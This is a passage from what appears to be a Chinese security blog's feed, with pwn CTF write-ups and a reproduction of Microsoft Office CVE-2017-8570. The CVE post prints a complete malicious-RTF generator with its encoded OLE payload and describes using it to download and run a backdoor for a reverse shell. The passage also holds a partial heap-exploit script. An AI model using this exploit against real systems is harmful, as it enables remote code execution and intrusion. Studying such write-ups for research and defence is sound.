alt="checksec"></p><ul><li><strong>漏洞位置</strong><br>用ida分析，整个程序简洁明了，功能完善，短小精悍，实乃精品。在<strong>size</strong>处我们可以申请任意长度的堆地址；<strong>string</strong>是通过<strong>gets</strong>进堆的，存在堆溢出漏洞；打印<strong>result</strong>时存在<del>格式化字符串漏洞</del>。<img src="http://upload-images.jianshu.io/upload_images/8447551-36626c7e8941ce37.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="漏洞位置"></li></ul><ul><li><strong>利用思路</strong><br>然鹅本程序开了FORTIFY保护机制，该机制引入了<strong>__printf_chk</strong>函数，导致你在使用<strong>%a$p</strong>时需要<strong>同时</strong>使用<strong>%(1到a)$p</strong>才可以，并且<strong>禁用了%n</strong>，所以利用格式化字符串写的这条路基本被pass掉，只有可能进行一些简单的<strong>leak</strong>。所以只有堆溢出可以尝试一下，却只有<strong>malloc</strong>而没有<strong>free</strong>，几乎玩不起来。在网上搜到了当时<strong>Hitcon2016</strong>中<strong>House of Orange</strong>的利用技巧，参考了两篇文章:<em><a href="http://bobao.360.cn/ctf/detail/178.html" target="_blank" rel="noopener">创造奇迹的Top Chunk</a>*以及</em><a href="http://www.cnblogs.com/shangye/p/6268981.html" target="_blank" rel="noopener">ctf-HITCON-2016-houseoforange学习</a><em>。利用堆溢出将*</em>top chunk<strong>修改为满足下列条件的值后，再次</strong>malloc<strong>比</strong>fake top chunk<strong>更大的空间时将会创建一个</strong>新的堆块<strong>并调用</strong>init_free<strong>将</strong>旧堆块<strong>中的</strong>fake top chunk<strong>给</strong>free<strong>掉，即可利用此机制构造</strong>fake top chunk size<strong>实现</strong>fastbin attack<strong>或</strong>unsort bin attack**。</li></ul><blockquote><p><strong>触发_init_free的条件</strong><br>   1.大于MINSIZE(0X10)<br>   2.小于所需的大小 + MINSIZE<br>   3.prev inuse位设置为1<br>   4.old_top + oldsize要在一个页中.</p></blockquote><ul><li><strong>My-exp</strong><pre><code class="python"></code></pre></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2017-8570 Microsoft Office 逻辑漏洞复现和利用</title>
      <link href="/2020/03/12/CVE-2017-8570%20Microsoft%20Office%20%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%A9%E7%94%A8/"/>
      <url>/2020/03/12/CVE-2017-8570%20Microsoft%20Office%20%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%A9%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00漏洞简介"><a href="#0x00漏洞简介" class="headerlink" title="0x00漏洞简介"></a>0x00漏洞简介</h2><p><strong>CVE-2017-8570</strong>是继<strong>CVE-2017-0199</strong>后<strong>Microsoft Office</strong>的又一个逻辑漏洞，又称<strong>二代沙虫</strong>。相比于<strong>CVE-2017-0199</strong>，利用更加方便，影响更加广泛。</p><blockquote><p><strong>受影响的版本</strong><br>Microsoft Office 2016<br>Microsoft Office 2013<br>Microsoft Office 2010<br>Microsoft Office 2007</p></blockquote><a id="more"></a><h2 id="0x01实验环境"><a href="#0x01实验环境" class="headerlink" title="0x01实验环境"></a>0x01实验环境</h2><p><img src="https://upload-images.jianshu.io/upload_images/8447551-35b96ac8455bea13.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="Microsoft Office 2010"><br><img src="https://upload-images.jianshu.io/upload_images/8447551-147c4554216ff85e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="Win7 SP1 32bit"></p><h2 id="0x02复现过程-伪"><a href="#0x02复现过程-伪" class="headerlink" title="0x02复现过程(伪)"></a>0x02复现过程(伪)</h2><p>在网上普遍流传的有<strong>PPSX</strong>和<strong>RTF</strong>两个版本，前者比较广泛，网上博客复现也是<strong>PPSX</strong>版本比较多。在<a href="http://www.freebuf.com/vuls/161607.html" target="_blank" rel="noopener">CVE-2017-8570首次公开的野外样本及漏洞分析</a>中看到了<strong>RTF</strong>版本的利用过程以及<strong>Github</strong>上的<a href="https://github.com/rxwx/CVE-2017-8570" target="_blank" rel="noopener"><strong>RTF恶意文档生成工具</strong></a>，脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Package</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    Packager spec based on:</span></span><br><span class="line"><span class="string">    https://phishme.com/rtf-malware-delivery/</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    Dropping method by Haifei Li: </span></span><br><span class="line"><span class="string">    https://securingtomorrow.mcafee.com/mcafee-labs/dropping-files-temp-folder-raises-security-concerns/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Found being used itw by @MalwareParty:</span></span><br><span class="line"><span class="string">    https://twitter.com/MalwareParty/status/943861021260861440</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, filename)</span>:</span></span><br><span class="line">        self.filename = <span class="string">''</span>.join(random.choice(string.ascii_uppercase + string.digits) <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">15</span>)) + <span class="string">'.sct'</span></span><br><span class="line">        self.fakepath = <span class="string">'C:\\fakepath\\&#123;&#125;'</span>.format(self.filename)</span><br><span class="line"></span><br><span class="line">        self.orgpath = self.fakepath</span><br><span class="line">        self.datapath = self.fakepath</span><br><span class="line"></span><br><span class="line">        <span class="keyword">with</span> open(filename,<span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">            self.data = f.read()</span><br><span class="line"></span><br><span class="line">        self.OBJ_HEAD = <span class="string">r"&#123;\object\objemb\objw1\objh1&#123;\*\objclass Package&#125;&#123;\*\objdata "</span></span><br><span class="line">        self.OBJ_TAIL = <span class="string">r"0105000000000000&#125;&#125;"</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_object_header</span><span class="params">(self)</span>:</span></span><br><span class="line">        OLEVersion = <span class="string">'01050000'</span></span><br><span class="line">        FormatID = <span class="string">'02000000'</span></span><br><span class="line">        ClassName = <span class="string">'Package'</span></span><br><span class="line">        szClassName = struct.pack(<span class="string">"&lt;I"</span>, len(ClassName) + <span class="number">1</span>).encode(<span class="string">'hex'</span>)</span><br><span class="line">        szPackageData = struct.pack(<span class="string">"&lt;I"</span>, len(self.get_package_data())/<span class="number">2</span>).encode(<span class="string">'hex'</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">''</span>.join([</span><br><span class="line">            OLEVersion,</span><br><span class="line">            FormatID,</span><br><span class="line">            szClassName,</span><br><span class="line">            ClassName.encode(<span class="string">'hex'</span>) + <span class="string">'00'</span>,</span><br><span class="line">            <span class="string">'00000000'</span>,</span><br><span class="line">            <span class="string">'00000000'</span>,</span><br><span class="line">            szPackageData,</span><br><span class="line">        ])</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_package_data</span><span class="params">(self)</span>:</span>  </span><br><span class="line">        StreamHeader = <span class="string">'0200'</span></span><br><span class="line">        Label = self.filename.encode(<span class="string">'hex'</span>) + <span class="string">'00'</span></span><br><span class="line">        OrgPath = self.orgpath.encode(<span class="string">'hex'</span>) + <span class="string">'00'</span></span><br><span class="line">        UType = <span class="string">'00000300'</span></span><br><span class="line">        DataPath = self.datapath.encode(<span class="string">'hex'</span>) + <span class="string">'00'</span></span><br><span class="line">        DataPathLen = struct.pack(<span class="string">"&lt;I"</span>, len(self.datapath)+<span class="number">1</span>).encode(<span class="string">'hex'</span>)</span><br><span class="line">        DataLen = struct.pack(<span class="string">"&lt;I"</span>, len(self.data)).encode(<span class="string">'hex'</span>)</span><br><span class="line">        Data = self.data.encode(<span class="string">'hex'</span>)</span><br><span class="line">        OrgPathWLen = struct.pack(<span class="string">"&lt;I"</span>, len(self.datapath)).encode(<span class="string">'hex'</span>)</span><br><span class="line">        OrgPathW = self.datapath.encode(<span class="string">'utf-16le'</span>).encode(<span class="string">'hex'</span>)</span><br><span class="line">        LabelLen = struct.pack(<span class="string">"&lt;I"</span>, len(self.filename)).encode(<span class="string">'hex'</span>)</span><br><span class="line">        LabelW = self.filename.encode(<span class="string">'utf-16le'</span>).encode(<span class="string">'hex'</span>)</span><br><span class="line">        DefPathWLen = struct.pack(<span class="string">"&lt;I"</span>, len(self.orgpath)).encode(<span class="string">'hex'</span>)</span><br><span class="line">        DefPathW = self.orgpath.encode(<span class="string">'utf-16le'</span>).encode(<span class="string">'hex'</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">''</span>.join([</span><br><span class="line">            StreamHeader,</span><br><span class="line">            Label,</span><br><span class="line">            OrgPath,</span><br><span class="line">            UType,</span><br><span class="line">            DataPathLen,</span><br><span class="line">            DataPath,</span><br><span class="line">            DataLen,</span><br><span class="line">            Data,</span><br><span class="line">            OrgPathWLen,</span><br><span class="line">            OrgPathW,</span><br><span class="line">            LabelLen,</span><br><span class="line">            LabelW,</span><br><span class="line">            DefPathWLen,</span><br><span class="line">            DefPathW,</span><br><span class="line">        ])</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">build_package</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.OBJ_HEAD + self.get_object_header() + self.get_package_data() + self.OBJ_TAIL</span><br><span class="line"></span><br><span class="line"><span class="comment"># Bypassing CVE-2017-0199 patch with Composite Moniker: https://justhaifei1.blogspot.co.uk/2017/07/bypassing-microsofts-cve-2017-0199-patch.html</span></span><br><span class="line">EXPLOIT_RTF = <span class="string">r"""&#123;&#123;\rt&#123;0&#125;&#123;&#123;\object\objautlink\objupdate&#123;&#123;\*\objclass Word.Document.8&#125;&#125;&#123;&#123;\*\objdata 0105000002000000090000004F4C45324C696E6B000000000000000000000A0000D0CF11E0A1B11AE1000000000000000000000000000000003E000300FEFF0900060000000000000000000000010000000100000000000000001000000200000001000000FEFFFFFF0000000000000000FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFDFFFFFFFEFFFFFFFEFFFFFFFEFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF52006F006F007400200045006E00740072007900000000000000000000000000000000000000000000000000000000000000000000000000000000000000000016000500FFFFFFFFFFFFFFFF020000000003000000000000C000000000000046000000000000000000000000704D6CA637B5D20103000000000200000000000001004F006C00650000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000A000200FFFFFFFFFFFFFFFFFFFFFFFF00000000000000000000000000000000000000000000000000000000000000000000000000000000100100000000000003004F0062006A0049006E0066006F00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000120002010100000003000000FFFFFFFF00000000000000000000000000000000000000000000000000000000000000000000000004000000060000000000000003004C0069006E006B0049006E0066006F000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000014000200FFFFFFFFFFFFFFFFFFFFFFFF00000000000000000000000000000000000000000000000000000000000000000000000005000000B700000000000000010000000200000003000000FEFFFFFFFEFFFFFF0600000007000000FEFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF010000020900000001000000000000000000000000000000C00000000903000000000000C000000000000046020000000303000000000000C00000000000004600001A00000025544D50255C&#123;1&#125;000E00ADDE000000000000000000000000000000000000000038000000320000000300250054004D00500025005C00&#123;2&#125;C6AFABEC197FD211978E0000F8757E2A000000000000000000000000000000000000000000000000FFFFFFFF0609020000000000C00000000000004600000000FFFFFFFF0000000000000000906660A637B5D201000000000000000000000000000000000000000000000000100203000D00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000105000000000000&#125;&#125;&#125;&#125;&#125;&#125;"""</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">build_exploit</span><span class="params">(sct)</span>:</span></span><br><span class="line">    p = Package(sct)</span><br><span class="line">    package = p.build_package()</span><br><span class="line">    <span class="keyword">return</span> EXPLOIT_RTF.format(package, p.filename.encode(<span class="string">'hex'</span>), p.filename.encode(<span class="string">'utf-16le'</span>).encode(<span class="string">'hex'</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">"PoC exploit for CVE-2017-8750 (a.k.a. \"composite moniker\") using Packager.dll file drop method"</span>)</span><br><span class="line">    parser.add_argument(<span class="string">"-s"</span>, <span class="string">"--sct"</span>, help=<span class="string">"Sct file to execute"</span>, required=<span class="literal">True</span>)</span><br><span class="line">    parser.add_argument(<span class="string">'-o'</span>, <span class="string">"--output"</span>, help=<span class="string">"Output file for RTF"</span>, default = <span class="string">"example.rtf"</span>)</span><br><span class="line"></span><br><span class="line">    args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> open(args.output, <span class="string">'w'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(build_exploit(args.sct))    </span><br><span class="line"><span class="keyword">print</span> <span class="string">"[+] RTF file written to: &#123;&#125;"</span>.format(args.output)</span><br></pre></td></tr></table></figure><p>复现并不困难，不需要像<strong>CVE-2017-0199</strong>那样配置服务器什么的，只需要在本地构造好命令执行的<strong>.sct</strong>文件，再编码并按照<strong>RTF</strong>文档格式写入就能够复现。<del>其实就是跟着大佬的<strong>Github</strong>上的流程走一遍(逃)</del><br><img src="https://upload-images.jianshu.io/upload_images/8447551-12c67c6628229529.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="poc.sct"><br><img src="https://upload-images.jianshu.io/upload_images/8447551-5f4f7e16917dba89.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="复现成功"></p><h2 id="0x03利用过程-简单的"><a href="#0x03利用过程-简单的" class="headerlink" title="0x03利用过程(简单的)"></a>0x03利用过程(简单的)</h2><p>思路也是和上次的<strong>CVE-2017-0199</strong>一样，既然已经的到了命令执行，所以只需要将<strong>poc</strong>的<strong>calc.sct</strong>中执行的命令改为攻击载荷即可实现利用：将服务器上的后门文件下载到本地<strong>%tmp%</strong>目录下并执行。<br><img src="https://upload-images.jianshu.io/upload_images/8447551-adeb1564dde09f99.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="poc.sct"><br><img src="https://upload-images.jianshu.io/upload_images/8447551-a0e3e2321c3495fb.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="exp.sct"><br><img src="https://upload-images.jianshu.io/upload_images/8447551-7d73dc3f2a2ad218.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="解析到tmp目录并下载后门"><br><img src="https://upload-images.jianshu.io/upload_images/8447551-b5b9fbd7937df8fa.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="执行后门文件"><br><img src="https://upload-images.jianshu.io/upload_images/8447551-6a86a232a73e196b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="远程反弹Shell"></p><h2 id="0x04写在后面"><a href="#0x04写在后面" class="headerlink" title="0x04写在后面"></a>0x04写在后面</h2><p>逻辑漏洞的复现并没有进到代码层去分析，主要就是跟着网上已有的利用来构造一些简单的攻击脚本，学了几句<strong>vbs</strong>。在<a href="http://www.freebuf.com/vuls/168829.html" target="_blank" rel="noopener">海莲花<strong>APT</strong>团伙利用<strong>CVE-2017-8570</strong>漏洞的新样本及关联分析 </a>这篇文章中看到了更加高级的利用方式，有时间要将<strong>rtf</strong>文件的结构看看。<a href="https://github.com/temesgeny/ppsx-file-generator" target="_blank" rel="noopener"><strong>Github</strong>上<strong>ppsx</strong>版本的<strong>exp</strong></a>。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Vulnerability </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第二届强网杯pwn writeup【部分】</title>
      <link href="/2020/03/12/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%9D%AFpwn%20writeup%E3%80%90%E9%83%A8%E5%88%86%E3%80%91/"/>
      <url>/2020/03/12/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%9D%AFpwn%20writeup%E3%80%90%E9%83%A8%E5%88%86%E3%80%91/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>看神仙打架系列，题太多了，自己太菜了，还是只有沦落到赛后复现大佬们的Write Up的地步了，什么时候才能在比赛中做出来几道pwn题呢</p><a id="more"></a><h2 id="0x01-Silent"><a href="#0x01-Silent" class="headerlink" title="0x01 Silent"></a>0x01 Silent</h2><ul><li><strong>漏洞位置</strong></li></ul><p><strong>del</strong>函数<strong>free</strong>掉堆块后没有清空指针造成了<strong>dangling_ptr</strong>。并且<strong>edit</strong>函数在使用时没有检查堆块是否已经<strong>free</strong>。</p><ul><li><strong>利用思路</strong><br>利用<strong>UAF</strong>构造<strong>fastbin attack</strong>。申请堆块，释放堆块进入<strong>fastbin</strong>，<strong>edit</strong>释放的堆块，修改其中的<strong>fd</strong>到<strong>got</strong>表上去，再申请回来，修改<strong>got</strong>表。<blockquote><p><strong>Fastbin Attack</strong><br>在<strong>malloc</strong>回来的时候会检查<strong>size</strong>位，看这个堆块是不是属于该<strong>Fastbin</strong>中，不过只检查低<strong>4字节</strong>，如果<strong>size</strong>位为<strong>61</strong>，那么检查时<strong>61-6f</strong>都能通过。</p></blockquote></li><li><strong>my-exp</strong><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">p = process(<span class="string">'./silent'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc-2.23.so'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">'39.107.32.132'</span> , <span class="number">10000</span>)<span class="comment">#nc 39.107.32.132 10000</span></span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc-2.23.so'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(length , text)</span>:</span></span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">sleep(<span class="number">0.3</span>)</span><br><span class="line">p.sendline(str(length))</span><br><span class="line">sleep(<span class="number">0.3</span>)</span><br><span class="line">p.sendline(text)</span><br><span class="line">sleep(<span class="number">0.3</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span><span class="params">(num)</span>:</span></span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">sleep(<span class="number">0.3</span>)</span><br><span class="line">p.sendline(str(num))</span><br><span class="line">sleep(<span class="number">0.3</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(num , text)</span>:</span></span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line">sleep(<span class="number">0.3</span>)</span><br><span class="line">p.sendline(str(num))</span><br><span class="line">sleep(<span class="number">0.3</span>)</span><br><span class="line">p.sendline(text)</span><br><span class="line">sleep(<span class="number">0.3</span>)</span><br><span class="line">p.sendline(<span class="string">''</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">()</span>:</span></span><br><span class="line"><span class="keyword">print</span> pidof(p)[<span class="number">0</span>]</span><br><span class="line">raw_input()</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./silent'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'==+RWBXtIRRV+.+IiYRBYBRRYYIRI;VitI;=;..........:::.::;::::...;;;:.'</span>)</span><br><span class="line">fake_chunk = <span class="number">0x601ffa</span></span><br><span class="line">system_plt = <span class="number">0x400730</span></span><br><span 